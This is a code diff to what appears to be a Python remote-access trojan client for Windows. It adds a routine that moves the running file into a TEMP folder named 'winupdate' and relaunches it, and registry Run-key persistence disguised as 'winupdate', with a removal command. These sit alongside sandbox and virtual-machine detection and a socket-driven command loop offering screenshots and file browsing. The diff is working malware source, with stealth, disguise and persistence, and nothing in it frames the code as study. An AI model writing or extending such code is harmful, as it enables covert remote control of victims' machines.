@@ -12,12 +12,31 @@ TMP = os.environ["TEMP"]  # get temp path
 APPDATA = os.environ["APPDATA"]
 intBuff = 1024
 
+blnMeltFile = False
+blnAddToStartup = False
 
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
     sys.exit(0)
+
+
+# function to move file to tmp dir and relaunch
+def meltFile():
+    # ignore if the path is in appdata as well
+    if not (os.getcwd() == TMP + "\\winupdate") and not (os.getcwd() == APPDATA):
+        # if folder already exists
+        try:
+            os.mkdir(TMP + "\\winupdate")
+        except:
+            pass
+        strNewFile = TMP + "\\winupdate\\" + os.path.basename(sys.argv[0])
+
+        subprocess.Popen(
+            "timeout 2 & move /y " + os.path.realpath(sys.argv[0]) + " " +  # move file to TMP and then relaunch
+            strNewFile + " & cd  /d " + TMP + "\\winupdate\\" + " & " + strNewFile, shell=True)
+        sys.exit(0)
 
 
 def detectSandboxie():
@@ -34,6 +53,36 @@ def detectVM():
         if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
             return " (Virtual Machine) "
     return ""
+
+
+def startup(onstartup):
+    try:
+        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
+        if not os.getcwd() == APPDATA:
+            copyfile(strPath, strAppPath)
+
+        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
+        CloseKey(objRegKey)
+    except WindowsError:
+        if not onstartup:
+            send(str.encode("Unable to add to startup! "))
+    else:
+        if not onstartup:
+            send(str.encode("success"))
+
+
+def remove_from_startup():
+    try:
+        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+        DeleteValue(objRegKey, "winupdate")
+        CloseKey(objRegKey)
+    except FileNotFoundError:
+        send(str.encode("Program is not registered in startup."))
+    except WindowsError as e:
+        send(str.encode("Error removing value!"))
+    else:
+        send(str.encode("success"))
 
 
 def server_connect():
@@ -58,6 +107,9 @@ recv = lambda buffer: objSocket.recv(buffer)
 
 # function to send encrypted data
 send = lambda data: objSocket.send(data)
+
+if blnMeltFile: meltFile()
+if blnAddToStartup: startup(True)
 
 server_connect()
 
@@ -104,19 +156,6 @@ def MessageBox(message):
     objVBS.write("Msgbox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
     objVBS.close()
     subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
-
-
-def startup():
-    try:
-        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
-        copyfile(strPath, strAppPath)
-
-        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
-        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
-    except WindowsError:
-        send(str.encode("Unable to add to startup!"))
-    else:
-        send(str.encode("success"))
 
 
 def screenshot():
@@ -367,7 +406,9 @@ while True:
             elif strData[:4] == "site":
                 webbrowser.get().open(strData[4:])
             elif strData == "startup":
-                startup()
+                startup(False)
+            elif strData == "rmvstartup":
+                remove_from_startup()
             elif strData == "screen":
                 screenshot()
             elif strData == "filebrowser":
